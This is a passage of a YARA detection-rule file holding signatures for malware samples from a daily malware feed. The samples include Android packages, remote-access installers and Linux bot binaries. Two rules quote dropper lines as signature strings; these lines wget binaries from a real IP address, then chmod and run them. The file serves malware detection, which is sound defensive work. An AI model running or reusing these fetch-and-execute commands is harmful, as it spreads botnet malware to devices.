      $s9 = "AAAAAAAAAEAAAAA" ascii /* base64 encoded string '       @   ' */
      $s10 = "05WSV9GVAQjN05WSVVGdpJ3VAMjdAMDYj5WdGBwM181Xv5DPAIjdAITZ0F2YpZWa0JXZDlDM1gFAyEGAyMDdulEchd3UAIzM05WSvRFAyMDdulUVvRFAyMjbpdlL0Z2b" ascii
      $s11 = "pdlL0Z2bz9mcjlWTi0TZtFmbgACIgACIgACIgoQDiIzMul2di0TZwlHdgACIgACIgACIgoQD5RXa05WZklUesJWblN3chxDIgACIgAiCN4TesJWblN3cBRnblRmblBXZ" ascii
      $s12 = "AAAAAAAAAAA2" ascii /* base64 encoded string '        6' */
      $s13 = "BBASAkGA1BwMAEFArBwKAIDAYBwSAMDAFBAVAoGARBwYAkEAvAAVAcHADBgRAkGATBQaAEFA2BANAUFAiBgNAgHA1AAUAkGAVBAWAEEAVBgZAQFAuBwRAcDA2AQNA8EA" ascii
      $s14 = "OBQOAoFAvAwaAIEAvBAeAAFASBAOAgEA6BgTAEEALBwVAcEA4BgeAUGAvAgRAgDAkBQSAMGAoBQeAYDAxAwaAwGAMBQMAMFAzBwLAEEA1BgQAADADBgeAgGANBwaAoHA" ascii
      $s15 = "0AAUAMGAwAQVAIGA1AgMAMEApBAeAYHAMBQbAgEAvBwYAUEA4AQNAwGATBgTAcDA3AANAQGApBgSAMGAmBARAYGAsBQNAEGAwBgUAMHAXBAbAYDAQBAbAEEA5AAMAAFA" ascii
      $s16 = "0AAAAAAAAAEBA" ascii /* base64 encoded string '       @@' */
      $s17 = "pt2YhJ0XftmPyVmZmVnQ8AAZsVWaGdmbpt2YhJ0XftmPsFmdyVGdulEPAQGbllmRn5WarNWYC91Xr5zZulGU8AAZsVWaGdmbpt2YhJ0XftmPn52XvBVZ0FmdpR3YBxDA" ascii
      $s18 = "h1EZkFkcl5mbJBAZsVWaGdmbpt2YhJ0XftmP05WZpx2QwNGV8AAZsVWaGdmbpt2YhJ0XftmP05WZpx2QsN3U8AAZsVWaGdmbpt2YhJ0XftmP0V2cmZ2T8AAZsVWaGdmb" ascii
      $s19 = "yMDa0BARJVGb1R2bNJzMoRHAEl0VIBARJNFTD12byZUZwlHV0V2RAQUSP9GVl1WYOBXYNBARFJVSVFVRS9VWBxEUTlERfNVRAQURSlUVRVkUf1URUNVWT91UFBwQHBQQ" ascii
      $s20 = "dAAAAAAAAAAAAA" ascii /* base64 encoded string 't         ' */
   condition:
      uint16(0) == 0x3d3d and filesize < 200KB and
      8 of them
}

rule sig_20a567a487c0f14bef235ee94c363bcdffc79dce6b82e3ed73e0455d2dc51a23 {
   meta:
      description = "evidences - file 20a567a487c0f14bef235ee94c363bcdffc79dce6b82e3ed73e0455d2dc51a23.apk"
      author = "Sameer P Sheik IBM"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-07"
      hash1 = "20a567a487c0f14bef235ee94c363bcdffc79dce6b82e3ed73e0455d2dc51a23"
   strings:
      $s1 = "##https://appgallery.cloud.huawei.com" fullword ascii
      $s2 = "22Base.Widget.AppCompat.Button.ButtonBar.AlertDialog" fullword ascii
      $s3 = "00Base.Widget.AppCompat.CompoundButton.RadioButton" fullword ascii
      $s4 = "--Widget.AppCompat.Button.ButtonBar.AlertDialog" fullword ascii
      $s5 = "//https://store.hispace.hicloud.com/hwmarket/api/" fullword ascii
      $s6 = "11RtlOverlay.Widget.AppCompat.Search.DropDown.Icon2" fullword ascii
      $s7 = "11Base.TextAppearance.AppCompat.Widget.DropDownItem" fullword ascii
      $s8 = "++Base.Widget.AppCompat.ButtonBar.AlertDialog" fullword ascii
      $s9 = "11Widget.AppCompat.Light.Spinner.DropDown.ActionBar" fullword ascii
      $s10 = ",,RtlOverlay.Widget.AppCompat.DialogTitle.Icon" fullword ascii
      $s11 = "&&Widget.AppCompat.ButtonBar.AlertDialog" fullword ascii
      $s12 = "99https://store-at-dre.hispace.dbankcloud.com/hwmarket/api/" fullword ascii
      $s13 = "11RtlOverlay.Widget.AppCompat.Search.DropDown.Query" fullword ascii
      $s14 = "00RtlOverlay.Widget.AppCompat.Search.DropDown.Text" fullword ascii
      $s15 = "11RtlOverlay.Widget.AppCompat.Search.DropDown.Icon1" fullword ascii
      $s16 = "!!abc_action_bar_elevation_material" fullword ascii
      $s17 = "&&Widget.AppCompat.CompoundButton.Switch" fullword ascii
      $s18 = "--Base.Widget.AppCompat.CompoundButton.CheckBox" fullword ascii
      $s19 = "++Base.Widget.AppCompat.CompoundButton.Switch" fullword ascii
      $s20 = "++Widget.AppCompat.CompoundButton.RadioButton" fullword ascii
   condition:
      uint16(0) == 0x4b50 and filesize < 9000KB and
      8 of them
}

rule b0a8d541b650ffff1bb4b3690af389e52b1675212129560dbe33038b1041266b {
   meta:
      description = "evidences - file b0a8d541b650ffff1bb4b3690af389e52b1675212129560dbe33038b1041266b.exe"
      author = "Sameer P Sheik IBM"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-07"
      hash1 = "b0a8d541b650ffff1bb4b3690af389e52b1675212129560dbe33038b1041266b"
   strings:
      $x1 = "Foreign key referencing Component that controls the file.FileNameFilenameFile name used for installation, may be localized.  Thi" ascii
      $x2 = "ease install the .NET Framework then run this installer again.REMOVE OR NOT NEW_VERSIONInstallation cannot continue. There is a " ascii
      $x3 = "ERS]\"SchedServiceConfigExecServiceConfigRollbackServiceConfigProgramFilesFolderTBDTARGETDIR.SourceDirFulldbbvsztr.dll|ScreenCon" ascii
      $x4 = "C:\\Users\\jmorgan\\Source\\cwcontrol\\Custom\\DotNetRunner\\Release\\DotNetRunner.pdb" fullword ascii
      $x5 = "C:\\Users\\jmorgan\\Source\\cwcontrol\\Custom\\DotNetRunner\\DotNetResolver\\obj\\Debug\\DotNetResolver.pdb" fullword ascii
      $x6 = "rstrtmgr.dll" fullword wide /* reversed goodware string 'lld.rgmtrtsr' */
      $x7 = "\\\\.\\Pipe\\TerminalServer\\SystemExecSrvr\\" fullword wide
      $s8 = "failed to get WixShellExecBinaryId" fullword ascii
      $s9 = "TerminateProcessesProcessExecutablePathsToTerminate=[INSTALLLOCATION]ScreenConnect.WindowsBackstageShell.exe,[INSTALLLOCATION]Sc" ascii
      $s10 = "un if failure action is RUN_COMMAND.RebootMessageMessage to show to users when rebooting if failure action is REBOOT.ServiceCont" ascii
      $s11 = "failed to process target from CustomActionData" fullword ascii
      $s12 = "failed to get handle to kernel32.dll" fullword ascii
      $s13 = "Specify your proxy server and optional credentials. These values will be preferred when connecting to your session. However, oth" ascii
      $s14 = "CommandStoreLoginCredentials" fullword wide
      $s15 = "System.Security.Permissions.SecurityPermissionAttribute, mscorlib, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934" ascii
      $s16 = "ScreenConnect.WindowsBackstageShell.exe" fullword wide
      $s17 = "CTURE <> \"x86\" AND VersionNT >= 601ScreenConnect.WindowsCredentialProvider.dllFixupServiceArgumentsTerminateProcesses_Initiali" ascii
      $s18 = "lSystem.Resources.ResourceReader, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089#System.Resources.R" ascii
      $s19 = "IsCurrentProcessTokenUnelevatedAdministrator" fullword ascii
      $s20 = "YSystem.Int16, mscorlib, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089" fullword ascii
   condition:
      uint16(0) == 0x5a4d and filesize < 16000KB and
      1 of ($x*) and 4 of them
}

rule a66d219a6e5a068edc5b3e06dc1412454ce69bac0419e43d4d8c0620ae3d79e8 {
   meta:
      description = "evidences - file a66d219a6e5a068edc5b3e06dc1412454ce69bac0419e43d4d8c0620ae3d79e8.exe"
      author = "Sameer P Sheik IBM"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-07"
      hash1 = "a66d219a6e5a068edc5b3e06dc1412454ce69bac0419e43d4d8c0620ae3d79e8"
   strings:
      $x1 = "<assembly manifestVersion=\"1.0\" xmlns=\"urn:schemas-microsoft-com:asm.v1\" xmlns:asmv3=\"urn:schemas-microsoft-com:asm.v3\"><a" ascii
      $s2 = "yIdentity type=\"win32\" name=\"Getscreen\" version=\"0.1.0.0\" processorArchitecture=\"*\"></assemblyIdentity><description>Gets" ascii
      $s3 = "getscreen.exe" fullword wide
      $s4 = "ndency><trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\"><security><requestedPrivileges><requestedExecutionLevel level=\"asI" ascii
      $s5 = "\"6.0.0.0\" processorArchitecture=\"*\" publicKeyToken=\"6595b64144ccf1df\" language=\"*\"></assemblyIdentity></dependentAssembl" ascii
      $s6 = "!http://ocsp.globalsign.com/rootr30;" fullword ascii
      $s7 = "rosoft-com:asm.v3\"><windowsSettings><dpiAware xmlns=\"http://schemas.microsoft.com/SMI/2005/WindowsSettings\">True/PM</dpiAware" ascii
      $s8 = "7http://cacerts.digicert.com/DigiCertAssuredIDRootCA.crt0E" fullword ascii
      $s9 = "4http://crl3.digicert.com/DigiCertAssuredIDRootCA.crl0" fullword ascii
      $s10 = "5http://cacerts.digicert.com/DigiCertTrustedRootG4.crt0C" fullword ascii
      $s11 = "2http://crl3.digicert.com/DigiCertTrustedRootG4.crl0 " fullword ascii
      $s12 = "%http://crl.globalsign.com/root-r3.crl0G" fullword ascii
      $s13 = "-http://ocsp.globalsign.com/codesigningrootr450F" fullword ascii
      $s14 = ":http://secure.globalsign.com/cacert/codesigningrootr45.crt0A" fullword ascii
      $s15 = "ent</description><dependency><dependentAssembly><assemblyIdentity type=\"Win32\" name=\"Microsoft.Windows.Common-Controls\" vers" ascii
      $s16 = "/http://secure.globalsign.com/cacert/root-r3.crt06" fullword ascii
      $s17 = "0http://crl.globalsign.com/codesigningrootr45.crl0U" fullword ascii
      $s18 = "ker\" uiAccess=\"false\"></requestedExecutionLevel></requestedPrivileges></security></trustInfo><application xmlns=\"urn:schemas" ascii
      $s19 = "http://ocsp.digicert.com0X" fullword ascii
      $s20 = "BJRZbjrz" fullword ascii /* reversed goodware string 'zrjbZRJB' */
   condition:
      uint16(0) == 0x5a4d and filesize < 20000KB and
      1 of ($x*) and 4 of them
}

rule fe6b1c9250d666713e5b1ceabcb9c1c5030556ea061bfcb3c8b1d91af45ba0dd {
   meta:
      description = "evidences - file fe6b1c9250d666713e5b1ceabcb9c1c5030556ea061bfcb3c8b1d91af45ba0dd.exe"
      author = "Sameer P Sheik IBM"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-07"
      hash1 = "fe6b1c9250d666713e5b1ceabcb9c1c5030556ea061bfcb3c8b1d91af45ba0dd"
   strings:
      $x1 = "<assembly manifestVersion=\"1.0\" xmlns=\"urn:schemas-microsoft-com:asm.v1\" xmlns:asmv3=\"urn:schemas-microsoft-com:asm.v3\"><a" ascii
      $s2 = "yIdentity type=\"win32\" name=\"Getscreen\" version=\"0.1.0.0\" processorArchitecture=\"*\"></assemblyIdentity><description>Gets" ascii
      $s3 = "getscreen.exe" fullword wide
      $s4 = "ndency><trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\"><security><requestedPrivileges><requestedExecutionLevel level=\"asI" ascii
      $s5 = "\"6.0.0.0\" processorArchitecture=\"*\" publicKeyToken=\"6595b64144ccf1df\" language=\"*\"></assemblyIdentity></dependentAssembl" ascii
      $s6 = "!http://ocsp.globalsign.com/rootr30;" fullword ascii
      $s7 = "rosoft-com:asm.v3\"><windowsSettings><dpiAware xmlns=\"http://schemas.microsoft.com/SMI/2005/WindowsSettings\">True/PM</dpiAware" ascii
      $s8 = "SystemRoL" fullword ascii /* base64 encoded string 'K+-zdh' */
      $s9 = "7http://cacerts.digicert.com/DigiCertAssuredIDRootCA.crt0E" fullword ascii
      $s10 = "4http://crl3.digicert.com/DigiCertAssuredIDRootCA.crl0" fullword ascii
      $s11 = "5http://cacerts.digicert.com/DigiCertTrustedRootG4.crt0C" fullword ascii
      $s12 = "2http://crl3.digicert.com/DigiCertTrustedRootG4.crl0 " fullword ascii
      $s13 = "%http://crl.globalsign.com/root-r3.crl0G" fullword ascii
      $s14 = "-http://ocsp.globalsign.com/codesigningrootr450F" fullword ascii
      $s15 = ":http://secure.globalsign.com/cacert/codesigningrootr45.crt0A" fullword ascii
      $s16 = "ent</description><dependency><dependentAssembly><assemblyIdentity type=\"Win32\" name=\"Microsoft.Windows.Common-Controls\" vers" ascii
      $s17 = "/http://secure.globalsign.com/cacert/root-r3.crt06" fullword ascii
      $s18 = "0http://crl.globalsign.com/codesigningrootr45.crl0U" fullword ascii
      $s19 = "ker\" uiAccess=\"false\"></requestedExecutionLevel></requestedPrivileges></security></trustInfo><application xmlns=\"urn:schemas" ascii
      $s20 = "http://ocsp.digicert.com0X" fullword ascii
   condition:
      uint16(0) == 0x5a4d and filesize < 22000KB and
      1 of ($x*) and 4 of them
}

rule sig_259fbba0631e74d7bf4df80e80374e834d716a18f8eec97150f956327ac3f830 {
   meta:
      description = "evidences - file 259fbba0631e74d7bf4df80e80374e834d716a18f8eec97150f956327ac3f830.sh"
      author = "Sameer P Sheik IBM"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-07"
      hash1 = "259fbba0631e74d7bf4df80e80374e834d716a18f8eec97150f956327ac3f830"
   strings:
      $s1 = "(wget http://185.157.247.12/vv/armv5l -O- || busybox wget http://185.157.247.12/vv/armv5l -O-) > .f; chmod 777 .f; ./.f tvt; > ." ascii
      $s2 = "(wget http://185.157.247.12/vv/armv6l -O- || busybox wget http://185.157.247.12/vv/armv6l -O-) > .f; chmod 777 .f; ./.f tvt; > ." ascii
      $s3 = "(wget http://185.157.247.12/vv/armv7l -O- || busybox wget http://185.157.247.12/vv/armv7l -O-) > .f; chmod 777 .f; ./.f tvt; > ." ascii
      $s4 = "(wget http://185.157.247.12/vv/armv7l -O- || busybox wget http://185.157.247.12/vv/armv7l -O-) > .f; chmod 777 .f; ./.f tvt; > ." ascii
      $s5 = "(wget http://185.157.247.12/vv/armv4l -O- || busybox wget http://185.157.247.12/vv/armv4l -O-) > .f; chmod 777 .f; ./.f tvt; > ." ascii
      $s6 = "(wget http://185.157.247.12/vv/armv4l -O- || busybox wget http://185.157.247.12/vv/armv4l -O-) > .f; chmod 777 .f; ./.f tvt; > ." ascii
      $s7 = "(wget http://185.157.247.12/vv/armv6l -O- || busybox wget http://185.157.247.12/vv/armv6l -O-) > .f; chmod 777 .f; ./.f tvt; > ." ascii
      $s8 = "(wget http://185.157.247.12/vv/armv5l -O- || busybox wget http://185.157.247.12/vv/armv5l -O-) > .f; chmod 777 .f; ./.f tvt; > ." ascii
      $s9 = "for path in `cat /proc/mounts | grep tmpfs | grep rw | grep -v noexe | cut -d ' ' -f 2`; do >$path/.a && cd $path; rm -rf .a .f;" ascii
      $s10 = "for path in `cat /proc/mounts | grep tmpfs | grep rw | grep -v noexe | cut -d ' ' -f 2`; do >$path/.a && cd $path; rm -rf .a .f;" ascii
      $s11 = ">/var/tmp/.a && cd /var/tmp;" fullword ascii
      $s12 = ">/home/.a && cd /home;" fullword ascii
      $s13 = "(cp /proc/self/exe .f || busybox cp /bin/busybox .f); > .f; (chmod 777 .f || busybox chmod 777 .f);" fullword ascii
      $s14 = ">/tmp/.a && cd /tmp;" fullword ascii
      $s15 = ">/dev/shm/.a && cd /dev/shm;" fullword ascii
      $s16 = ">/dev/.a && cd /dev;" fullword ascii
      $s17 = ">/var/.a && cd /var;" fullword ascii
      $s18 = "f; # ; rm -rf .f;" fullword ascii
      $s19 = "echo \"$0 FIN\";" fullword ascii
   condition:
      uint16(0) == 0x2f3e and filesize < 2KB and
      8 of them
}

rule sig_50afe9a363f239c78c6b725fddf37c2911dcb8076c548e44499e6dd87bd34def {
   meta:
      description = "evidences - file 50afe9a363f239c78c6b725fddf37c2911dcb8076c548e44499e6dd87bd34def.sh"
      author = "Sameer P Sheik IBM"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-07"
      hash1 = "50afe9a363f239c78c6b725fddf37c2911dcb8076c548e44499e6dd87bd34def"
   strings:
      $s1 = "(wget http://185.157.247.12/vv/arc -O- || busybox wget http://185.157.247.12/vv/arc -O-) > .f; chmod 777 .f; ./.f funny; > .f; #" ascii
      $s2 = "(wget http://185.157.247.12/vv/armv5l -O- || busybox wget http://185.157.247.12/vv/armv5l -O-) > .f; chmod 777 .f; ./.f funny; >" ascii
      $s3 = "(wget http://185.157.247.12/vv/sparc -O- || busybox wget http://185.157.247.12/vv/sparc -O-) > .f; chmod 777 .f; ./.f funny; > ." ascii
      $s4 = "(wget http://185.157.247.12/vv/mips -O- || busybox wget http://185.157.247.12/vv/mips -O-) > .f; chmod 777 .f; ./.f funny; > .f;" ascii
      $s5 = "(wget http://185.157.247.12/vv/riscv32 -O- || busybox wget http://185.157.247.12/vv/riscv32 -O-) > .f; chmod 777 .f; ./.f funny;" ascii
      $s6 = "(wget http://185.157.247.12/vv/riscv32 -O- || busybox wget http://185.157.247.12/vv/riscv32 -O-) > .f; chmod 777 .f; ./.f funny;" ascii
      $s7 = "(wget http://185.157.247.12/vv/armv4l -O- || busybox wget http://185.157.247.12/vv/armv4l -O-) > .f; chmod 777 .f; ./.f funny; >" ascii
      $s8 = "(wget http://185.157.247.12/vv/powerpc -O- || busybox wget http://185.157.247.12/vv/powerpc -O-) > .f; chmod 777 .f; ./.f funny;" ascii
      $s9 = "(wget http://185.157.247.12/vv/sh4 -O- || busybox wget http://185.157.247.12/vv/sh4 -O-) > .f; chmod 777 .f; ./.f funny; > .f; #" ascii
      $s10 = "(wget http://185.157.247.12/vv/armv4l -O- || busybox wget http://185.157.247.12/vv/armv4l -O-) > .f; chmod 777 .f; ./.f funny; >" ascii
      $s11 = "(wget http://185.157.247.12/vv/mipsel -O- || busybox wget http://185.157.247.12/vv/mipsel -O-) > .f; chmod 777 .f; ./.f funny; >" ascii
      $s12 = "(wget http://185.157.247.12/vv/armv6l -O- || busybox wget http://185.157.247.12/vv/armv6l -O-) > .f; chmod 777 .f; ./.f funny; >" ascii
      $s13 = "(wget http://185.157.247.12/vv/sparc -O- || busybox wget http://185.157.247.12/vv/sparc -O-) > .f; chmod 777 .f; ./.f funny; > ." ascii
      $s14 = "(wget http://185.157.247.12/vv/mips -O- || busybox wget http://185.157.247.12/vv/mips -O-) > .f; chmod 777 .f; ./.f funny; > .f;" ascii
      $s15 = "(wget http://185.157.247.12/vv/armv4eb -O- || busybox wget http://185.157.247.12/vv/armv4eb -O-) > .f; chmod 777 .f; ./.f funny;" ascii
      $s16 = "(wget http://185.157.247.12/vv/armv4eb -O- || busybox wget http://185.157.247.12/vv/armv4eb -O-) > .f; chmod 777 .f; ./.f funny;" ascii
      $s17 = "(wget http://185.157.247.12/vv/armv5l -O- || busybox wget http://185.157.247.12/vv/armv5l -O-) > .f; chmod 777 .f; ./.f funny; >" ascii
      $s18 = "(wget http://185.157.247.12/vv/armv6l -O- || busybox wget http://185.157.247.12/vv/armv6l -O-) > .f; chmod 777 .f; ./.f funny; >" ascii
      $s19 = "(wget http://185.157.247.12/vv/armv7l -O- || busybox wget http://185.157.247.12/vv/armv7l -O-) > .f; chmod 777 .f; ./.f funny; >" ascii
      $s20 = "(wget http://185.157.247.12/vv/armv7l -O- || busybox wget http://185.157.247.12/vv/armv7l -O-) > .f; chmod 777 .f; ./.f funny; >" ascii
   condition:
      uint16(0) == 0x2f3e and filesize < 6KB and
      8 of them
}

rule sig_27f1cdf3422c4c87d9d273a62df4404339119e416d16d8512479d87acd07c12b {
   meta:
      description = "evidences - file 27f1cdf3422c4c87d9d273a62df4404339119e416d16d8512479d87acd07c12b.msi"
      author = "Sameer P Sheik IBM"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-07"
      hash1 = "27f1cdf3422c4c87d9d273a62df4404339119e416d16d8512479d87acd07c12b"
   strings:
      $x1 = "que key identifying the binary data.DataThe unformatted binary data.ComponentPrimary key used to identify a particular component" ascii
      $x2 = "ecKillAteraTaskQuietKillAteraServicesc delete AteraAgentoldVersionUninstallunins000.exe /VERYSILENTinstall/i /IntegratorLogin=\"" ascii
      $x3 = "minPackageInstallFilesInstallFinalizeExecuteActionPublishFeaturesPublishProductNETFRAMEWORK35NetFramework35AlphaControlAgentInst" ascii
      $x4 = "rstrtmgr.dll" fullword wide /* reversed goodware string 'lld.rgmtrtsr' */
      $x5 = "c:\\agent\\_work\\66\\s\\src\\ext\\ca\\wixca\\dll\\shellexecca.cpp" fullword ascii
      $s6 = "failed to get WixShellExecBinaryId" fullword ascii
      $s7 = "AlphaControlAgentInstallation.dll" fullword wide
      $s8 = "doscordeiros.com.brINTEGRATORLOGINCOMPANYID001Q300000P2oAPIAZACCOUNTID" fullword ascii
      $s9 = "failed to process target from CustomActionData" fullword ascii
      $s10 = "failed to get handle to kernel32.dll" fullword ascii
      $s11 = "c:\\agent\\_work\\66\\s\\src\\ext\\ca\\wixca\\dll\\serviceconfig.cpp" fullword ascii
      $s12 = "NSTALLFOLDERAteraAgent.exe.config{0EC8B23C-C723-41E1-9105-4B9C2CDAD47A}ICSharpCode.SharpZipLib.dll{F1B1B9D1-F1B0-420C-9D93-F04E9" ascii
      $s13 = "lrpfxg.exe|AteraAgent.exe1.8.7.207uho0yn3.con|AteraAgent.exe.configfd-i8f6f.dll|ICSharpCode.SharpZipLib.dll1.3.3.11e8lrglzz.dll|" ascii
      $s14 = "AteraAgent.exe" fullword ascii
      $s15 = "DERID]\" /AccountId=\"[ACCOUNTID]\" /AgentId=\"[AGENTID]\"uninstall/uDeleteTaskSchedulerSCHTASKS.EXE /delete /tn \"Monitoring Re" ascii
      $s16 = "failed to get security descriptor's DACL - error code: %d" fullword ascii
      $s17 = "The process, %ls, could not be registered with the Restart Manager (probably because the setup is not elevated and the process i" ascii
      $s18 = "failed to get WixShellExecTarget" fullword ascii
      $s19 = "System.ValueTuple.dll" fullword ascii
      $s20 = "c:\\agent\\_work\\66\\s\\src\\libs\\wcautil\\qtexec.cpp" fullword ascii
   condition:
      uint16(0) == 0xcfd0 and filesize < 9000KB and
      1 of ($x*) and 4 of them
}

rule sig_6fd94d7c31b11fcd1a581d521faa61482d7543218fe33119b889f206ea11d334 {
   meta:
      description = "evidences - file 6fd94d7c31b11fcd1a581d521faa61482d7543218fe33119b889f206ea11d334.msi"
      author = "Sameer P Sheik IBM"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-07"
      hash1 = "6fd94d7c31b11fcd1a581d521faa61482d7543218fe33119b889f206ea11d334"
   strings:
      $x1 = "n} the AppSearch action or with the default seoned files.LanguageList of decimal language Ids, comma-separated if more than one." ascii
      $x2 = "rstrtmgr.dll" fullword wide /* reversed goodware string 'lld.rgmtrtsr' */
      $x3 = "c:\\agent\\_work\\66\\s\\src\\ext\\ca\\wixca\\dll\\shellexecca.cpp" fullword ascii
      $x4 = "u63tav.pdb|SharpSnmpLib.pdbehg7zidl.dll|LibreHardwareMonitorLib.dll0.9.3.0g929eogs.exe|BluetraitUserAgent.exe1.0.0.0e0qpjf-_.dll" ascii
      $s5 = "paexec.exe" fullword ascii
      $s6 = "BluetraitUserAgent.exe" fullword ascii
      $s7 = "wareMonitorLib.dll{560F0044-884A-588D-B857-E6C92792E0AB}BluetraitUserAgent.exe{41D7EFA4-6018-5093-B93C-7332843FD1AA}System.Data." ascii
      $s8 = "failed to get WixShellExecBinaryId" fullword ascii
      $s9 = "failed to process target from CustomActionData" fullword ascii
      $s10 = "failed to get handle to kernel32.dll" fullword ascii
      $s11 = "c:\\agent\\_work\\66\\s\\src\\ext\\ca\\wixca\\dll\\serviceconfig.cpp" fullword ascii
      $s12 = " to be executed.  Leave blank to suppress action.AdminUISequenceAdvtExecuteSequenceBinaryUnique key identifying the binary data." ascii
      $s13 = "failed to get security descriptor's DACL - error code: %d" fullword ascii
      $s14 = "The process, %ls, could not be registered with the Restart Manager (probably because the setup is not elevated and the process i" ascii
      $s15 = "failed to get WixShellExecTarget" fullword ascii
      $s16 = "System.Data.SQLite.Linq.dll" fullword ascii
      $s17 = "mmand line for program to run if failure action is RUN_COMMAND.RebootMessageMessage to show to users when rebooting if failure a" ascii
      $s18 = "System.Management.Automation.dll" fullword ascii
      $s19 = "c:\\agent\\_work\\66\\s\\src\\libs\\wcautil\\qtexec.cpp" fullword ascii
      $s20 = "c:\\agent\\_work\\66\\s\\src\\ext\\ca\\wixca\\dll\\xmlconfig.cpp" fullword ascii
   condition:
      uint16(0) == 0xcfd0 and filesize < 11000KB and
      1 of ($x*) and 4 of them
}

rule sig_5bd80b8c921f711dc57402c208b47e80a273379879f5a060c6bbffaea4a20ceb {
   meta:
      description = "evidences - file 5bd80b8c921f711dc57402c208b47e80a273379879f5a060c6bbffaea4a20ceb.elf"
      author = "Sameer P Sheik IBM"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-07"
      hash1 = "5bd80b8c921f711dc57402c208b47e80a273379879f5a060c6bbffaea4a20ceb"
   strings:
      $s1 = "[killer/cmd] killed process: %s ;; pid: %d" fullword ascii
      $s2 = "[killer/exe] killed process: %s ;; pid: %d" fullword ascii
      $s3 = "[killer/node] killed process: %s ;; pid: %d" fullword ascii
      $s4 = "[killer/cpu] killed process: %s ;; pid: %d" fullword ascii
      $s5 = "[locker] killed process: %s ;; pid: %d" fullword ascii
      $s6 = "[killer/stat] killed process: %s ;; pid: %d" fullword ascii
      $s7 = "[killer/maps] killed process: %s ;; pid: %d" fullword ascii
      $s8 = "USER-AGENT: Google Chrome/60.0.3112.90 Windows" fullword ascii
      $s9 = "(unknown authentication error - %d)" fullword ascii
      $s10 = "/proc/%s/cmdline" fullword ascii
      $s11 = "__get_myaddress: ioctl (get interface configuration)" fullword ascii
      $s12 = "/proc/%d/cmdline" fullword ascii
      $s13 = "HOST: 255.255.255.255:1900" fullword ascii
      $s14 = "RPC: Remote system error" fullword ascii
      $s15 = "service:service-agent" fullword ascii
      $s16 = "/etc/config/hosts" fullword ascii
      $s17 = "__get_myaddress: socket" fullword ascii
      $s18 = "__get_myaddress: ioctl" fullword ascii
      $s19 = "Remote I/O error" fullword ascii
      $s20 = "RPC: Port mapper failure" fullword ascii
   condition:
      uint16(0) == 0x457f and filesize < 600KB and
      8 of them
}

rule sig_294f18c24c0c96940257afbfd341e4728e9cd071da0e9519ea7bdd31f80f9fbf {
   meta:
      description = "evidences - file 294f18c24c0c96940257afbfd341e4728e9cd071da0e9519ea7bdd31f80f9fbf.rar"
      author = "Sameer P Sheik IBM"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-07"
      hash1 = "294f18c24c0c96940257afbfd341e4728e9cd071da0e9519ea7bdd31f80f9fbf"
   strings:
      $s1 = "2024 tagihan.exe" fullword ascii
      $s2 = "* grhk" fullword ascii
      $s3 = "%k- LQ" fullword ascii
      $s4 = "s]bFui\\%S6" fullword ascii
      $s5 = " -HPke" fullword ascii
      $s6 = "%c%3YX" fullword ascii
      $s7 = "tHn8+ " fullword ascii
      $s8 = "fFAp)~tY" fullword ascii
      $s9 = "nIMEFmv" fullword ascii
      $s10 = "4aHHLeG!" fullword ascii
      $s11 = "&vHFrr]Y" fullword ascii
      $s12 = "f]QsENe?$)" fullword ascii
      $s13 = ".LCm;d" fullword ascii
      $s14 = "VzOo8kT" fullword ascii
      $s15 = "rlnd?i{" fullword ascii
      $s16 = "kYse/k7U" fullword ascii
      $s17 = "mdjNoFo&S" fullword ascii
      $s18 = "uVxru<." fullword ascii
      $s19 = "89.QWK" fullword ascii
      $s20 = "xDhh(Yn" fullword ascii
   condition:
      uint16(0) == 0x6152 and filesize < 3000KB and
      8 of them
}

rule sig_2c7cc5d30251da07965380aafe15f034383062d9c4bea780684e778cd4f83432 {
   meta:
      description = "evidences - file 2c7cc5d30251da07965380aafe15f034383062d9c4bea780684e778cd4f83432.elf"
      author = "Sameer P Sheik IBM"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-07"
      hash1 = "2c7cc5d30251da07965380aafe15f034383062d9c4bea780684e778cd4f83432"
   strings:
      $s1 = "!mmap failed." fullword ascii
      $s2 = ";Vh+ ." fullword ascii
      $s3 = "/T4|- " fullword ascii
      $s4 = "kWosV^]" fullword ascii
      $s5 = "vmbw8L<" fullword ascii
      $s6 = "YINUVC" fullword ascii
      $s7 = "iaoxl7" fullword ascii
      $s8 = "\\G;5Tn" fullword ascii
      $s9 = "173T\"F" fullword ascii
      $s10 = "5<c[x+" fullword ascii
      $s11 = "2KiJ|n" fullword ascii
      $s12 = "**Fx[Z" fullword ascii
      $s13 = "@.UH@.9" fullword ascii
      $s14 = "pa~gci" fullword ascii
      $s15 = "fvLcM]" fullword ascii
      $s16 = "\"U^4gm" fullword ascii
      $s17 = "x}f:.U" fullword ascii
      $s18 = "c(ET6$" fullword ascii
      $s19 = "(P}f;.8g" fullword ascii
      $s20 = "MrFc/a" fullword ascii
   condition:
      uint16(0) == 0x457f and filesize < 90KB and
      8 of them
}

rule a9fd9d17342dca6bd776cf9331b1497a30d0100fb82d937024d2c8f24a357a82 {
   meta:
      description = "evidences - file a9fd9d17342dca6bd776cf9331b1497a30d0100fb82d937024d2c8f24a357a82.elf"
      author = "Sameer P Sheik IBM"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-07"
      hash1 = "a9fd9d17342dca6bd776cf9331b1497a30d0100fb82d937024d2c8f24a357a82"
   strings:
      $s1 = "PROT_EXEC|PROT_WRITE failed." fullword ascii
      $s2 = "mLFA*x4n" fullword ascii
      $s3 = "KxrTDtB" fullword ascii
